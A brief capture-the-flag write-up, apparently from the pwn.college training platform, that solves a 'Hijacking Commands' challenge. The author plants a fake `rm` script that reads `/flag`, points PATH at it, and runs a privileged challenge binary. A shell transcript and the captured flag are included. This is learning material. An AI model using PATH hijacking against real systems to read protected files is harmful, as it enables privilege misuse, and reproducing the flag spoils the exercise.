# Hijacking Commands

First made a directory using `mkdir solution`. Then made it my current directory using `cd solution` then because of the absolute path of `cat` being `/run/dojo/bin/cat` so I overrid `rm` with it. Making it `cat flag`.
Then made `rm` executable using `chmod a+rwx rm` (only x was needed lol idk why I did r and w too), Then modified PATH to the solution directory. Then just ran `/challenge/run` to get the flag `pwn.college{conPCjMaNyj5lyrVswCDKxobXab.ddzNyUDL4gjN0czW}`


```bash
hacker@path~hijacking-commands:~$ mkdir solution
hacker@path~hijacking-commands:~$ cd solution
hacker@path~hijacking-commands:~/solution$ echo "/run/dojo/bin/cat /flag" > rm
hacker@path~hijacking-commands:~/solution$ chmod a+rwx rm
hacker@path~hijacking-commands:~/solution$ PATH=/home/hacker/solution
hacker@path~hijacking-commands:~/solution$ /challenge/run
Trying to remove /flag...
pwn.college{conPCjMaNyj5lyrVswCDKxobXab.ddzNyUDL4gjN0czW}
```
